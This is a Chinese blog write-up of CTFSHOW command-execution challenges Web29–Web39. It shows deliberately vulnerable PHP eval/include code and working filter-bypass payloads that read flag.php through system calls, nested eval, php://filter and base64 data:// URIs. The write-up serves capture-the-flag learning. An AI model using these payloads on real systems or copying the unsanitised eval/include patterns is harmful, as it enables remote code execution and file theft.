<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CTFSHOW-命令执行 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CTFSHOW-命令执行 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:15:48.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CTFSHOW-命令执行</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h3 id="Web29（通配符）"><a href="#Web29（通配符）" class="headerlink" title="Web29（通配符）"></a>Web29（通配符）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;             <span class="comment">//要求输入一个c</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;     <span class="comment">//c中不能有flag</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);            <span class="comment">//利用eval函数回显答案</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eval(string $code)</code>把字符串 <code>code</code> 作为PHP代码执行，<strong>并且里面的字符串结尾要加;号，否则不行</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;cup&#x27;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;coffee&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a $string with my $name in it.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$str = \&quot;<span class="subst">$str</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">/*This is a $string with my $name in it.</span></span><br><span class="line"><span class="comment">      This is a cup with my coffee in it.</span></span><br></pre></td></tr></table></figure>

<p>echo和system都可以执行程序外的指令，echo <code>指令内容</code>即可，system(指令)</p>
<p>然后linux系统内有通配符</p>
<blockquote>
<p>Linux通配符</p>
<p>“*”符号：代表0个或者多个字符。例如在一个目录下，搜索以.csv结尾的文件</p>
<p>“?”符号：代表任意一个字符.例如想要搜索以b字母开头，但是只有两个字母的文件名，并以.doc结尾的文件名</p>
<p>“[]”符号：匹配括号内包含的任一字符</p>
<p>“^“符号和”!”：通常与[]一起使用，代表取反</p>
</blockquote>
<p><strong>反引号的作用就是将反引号内的Linux命令先执行,然后将执行结果赋予变量。由’’ 、</strong><code>**^**</code><strong>、</strong><code>**()**</code>** 符号并不会影响命令的执行，所以我们可以插入这些符号来绕过(第一个是一对单引号)**</p>
<p>Linux中表示输出的函数有，cat,tac,more,nl</p>
<ol>
<li>cat 由第一行开始显示文件内容</li>
<li>tac 由最后一行开始显示文件内容（刚好和cat字母相反）</li>
<li>nl 按行号显示文件内容</li>
<li>more 一页一页翻动的读取</li>
</ol>
<blockquote>
<p>payload1:?c&#x3D;echo <code>cat fla&#39;&#39;g.php</code>；或者?c&#x3D;echo <code>tac fl?g.php</code>;等等</p>
<p>payload2:?c&#x3D;system(‘cat fla?.php’);</p>
<p>payload3:?c&#x3D;system(‘cat fl*’);等等在内</p>
</blockquote>
<h3 id="Web30（system类似函数）"><a href="#Web30（system类似函数）" class="headerlink" title="Web30（system类似函数）"></a>Web30（system类似函数）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法和Web29一模一样payload:?c&#x3D;echo <code>tac fla?.ph*</code>;</p>
<p>php有三个执行外部命令的函数:system()，exec()，passthru()，换一个使用即可</p>
<h3 id="Web31（参数逃逸，常规操作）"><a href="#Web31（参数逃逸，常规操作）" class="headerlink" title="Web31（参数逃逸，常规操作）"></a>Web31（参数逃逸，常规操作）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>); <span class="comment">//过滤了flag,system,php,cat,sort,shell,点，单引号，空格</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>前提要事</p>
<p>空格过滤：</p>
<p>1.&lt; 和&lt;&gt; 重定向符<br>2.%09(需要php环境)<br>3.<img src="https://g.yuque.com/gr/latex?%7BIFS%7D%0A4.#card=math&code=%7BIFS%7D%0A4.&id=SBVvg">IFS<img src="https://g.yuque.com/gr/latex?9%0A5.#card=math&code=9%0A5.&id=pYWhL">IFS<br>6.{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能<br>7.%20<br>8.%09 tab</p>
<p>注：在eval使用带有<img src="https://g.yuque.com/gr/latex?%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E7%94%A8%5C%E8%BD%AC%E4%B9%89%EF%BC%8C%E5%9B%A0%E4%B8%BA#card=math&code=%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E7%94%A8%5C%E8%BD%AC%E4%B9%89%EF%BC%8C%E5%9B%A0%E4%B8%BA&id=aTiSb">在php中有特殊含义</p>
</blockquote>
<p>姿势一Payload：?c&#x3D;echo%09<code>tac%09fl?g?p?p</code>;    ps:使用%09绕过空格</p>
<p>姿势二Payload:   ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘cat flag.php’);再访问源代码</p>
<p>姿势三Payload:   ?c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
<p>                                  <strong>姿势三请看Web41内的说明！！！！！！！！！！</strong></p>
<p><strong>重点姿势二</strong>：第二种方法的理解为，传入了c&#x3D;eval(<img src="https://g.yuque.com/gr/latex?_GET%5B1%5D">%3B%261%3Dsystem(‘cat%20flag.php’)%3B%E5%85%B6%E4%B8%AD%E7%9A%841%3Dsystem(‘cat%20flag.php’)%3B%E7%BB%95%E8%BF%87%E4%BA%86preg%5C_match%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB%EF%BC%8C1%E7%9A%84%E5%80%BC%E4%BC%A0%E5%88%B0%E4%BA%86%E7%AC%AC%E4%BA%8C%E4%B8%AAeval%E5%87%BD%E6%95%B0%E9%87%8C%E9%9D%A2%E4%B9%9F%E5%B0%B1%E6%98%AFeval(#card&#x3D;math&amp;code&#x3D;_GET%5B1%5D%29%3B%261%3Dsystem%28%27cat%20flag.php%27%29%3B%E5%85%B6%E4%B8%AD%E7%9A%841%3Dsystem%28%27cat%20flag.php%27%29%3B%E7%BB%95%E8%BF%87%E4%BA%86preg%5C_match%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB%EF%BC%8C1%E7%9A%84%E5%80%BC%E4%BC%A0%E5%88%B0%E4%BA%86%E7%AC%AC%E4%BA%8C%E4%B8%AAeval%E5%87%BD%E6%95%B0%E9%87%8C%E9%9D%A2%E4%B9%9F%E5%B0%B1%E6%98%AFeval%28&amp;id&#x3D;Shvl2)_GET[1])，在第二个eval内执行system函数。</p>
<blockquote>
<p>?c&#x3D;eval($_GET[2]);&amp;2&#x3D;system(‘cat flag.php’);</p>
<p>?c&#x3D;eval($_GET[a]);&amp;a&#x3D;system(‘cat flag.php’);</p>
<p>?c&#x3D;eval($_GET[a]);&amp;a&#x3D;echo <code>tac flag.php</code>;</p>
</blockquote>
<h3 id="Web32（过滤；）"><a href="#Web32（过滤；）" class="headerlink" title="Web32（过滤；）"></a>Web32（过滤；）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];	</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;      <span class="comment">//过滤flag,system,php,cat,sort,shell,.,空格，单引号，反引号，斜杠/</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一题过滤掉了以前所有的常规方法，所以这题我们用文件包含+逃逸+伪协议,利用文件包含函数include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile等等可以查看文件</p>
<blockquote>
<p>payload1:  ?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
</blockquote>
<p><strong>PS:其中的?&gt;用来绕过分号，因为?&gt;默认给你偷偷加了一个分号，接着将后面1的参数传入的include函数内，filter伪协议是用来读取文件内容的，遇到文件包含函数可以用来读取内容</strong></p>
<blockquote>
<p>payload2:   ?c&#x3D;include%09$_POST[1]?&gt;</p>
<p>post传参如图:</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663346675384-0fe9f9dc-180a-44f9-95db-dd87586824ee.png#averageHue=%23fcfcfb&clientId=u79439bbc-4f42-4&from=paste&height=286&id=u1c7c37f5&name=image.png&originHeight=358&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75518&status=done&style=none&taskId=u4c6e08fb-5500-4bad-9ccd-e762376e53c&title=&width=916.8" alt="image.png"><br><strong>PS:用PS方法提交参数，思路和payload1一致</strong></p>
<blockquote>
<p>payload3:  ?c&#x3D;include%09$_GET[1]?&gt;&amp;1&#x3D;data:text&#x2F;plain,</p>
</blockquote>
<p><strong>ps:date伪协议可以执行php命令，同样的用date伪协议也可用post方法传参，payload3为GET方法传参，post方法只需要将&amp;_GET&#x3D;&gt;&amp;_POST</strong></p>
<h3 id="Web33（同上）"><a href="#Web33（同上）" class="headerlink" title="Web33（同上）"></a>Web33（同上）</h3><p>双引号也被过滤掉了</p>
<p>payload与Web32一模一样</p>
<h3 id="Web34（同上）"><a href="#Web34（同上）" class="headerlink" title="Web34（同上）"></a>Web34（同上）</h3><p>冒号也被过滤了，由于上一题payload中只有php:&#x2F;&#x2F;filter协议里出现过冒号，所以不影响使用</p>
<p>payload同上</p>
<h3 id="Web35（同上）"><a href="#Web35（同上）" class="headerlink" title="Web35（同上）"></a>Web35（同上）</h3><p>过滤新增了尖括号，继续使用php:&#x2F;&#x2F;filter协议同上</p>
<p>payload一样</p>
<h3 id="Web36（同上）"><a href="#Web36（同上）" class="headerlink" title="Web36（同上）"></a>Web36（同上）</h3><p>等号与数字被过滤，我们将原来的数字再替换成字符即可</p>
<p>payload:    ?c&#x3D;include%09$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>payload2:       ?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="Web37（data协议编码绕过）"><a href="#Web37（data协议编码绕过）" class="headerlink" title="Web37（data协议编码绕过）"></a>Web37（data协议编码绕过）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;    <span class="comment">//过滤了flag函数</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到include就想到文件包含，文件包含就想到伪协议，然后这里显然不能用filter因为用了filter协议就要有flag的字眼，而且filter不能把输入的东西加密，只能把输出的东西加密，所以这里用data协议<strong>data:&#x2F;&#x2F;text&#x2F;plain;base64,内容</strong>，内容为：,用base64对其转码得到：PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</p>
<p>payload: ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</p>
<h3 id="Web38-同上）"><a href="#Web38-同上）" class="headerlink" title="Web38(同上）"></a>Web38(同上）</h3><p>比Web37多过滤了php和file，payload和Web38一致</p>
<h3 id="Web39（data协议）"><a href="#Web39（data协议）" class="headerlink" title="Web39（data协议）"></a>Web39（data协议）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 06:13:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;     <span class="comment">//过滤了flag</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里同样用data协议，但是include里面加了.php后缀，所以不能用base64进行加密，否则会出不来，这里直接payload&#x3D;?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,即可，用？通配符逃过过滤，然后由于这里的php命令已经闭合，所以.php无法影响，所以后面的.php会被当成html页面直接显示在页面上，起不到什么到什么作用，答案如图：</p>
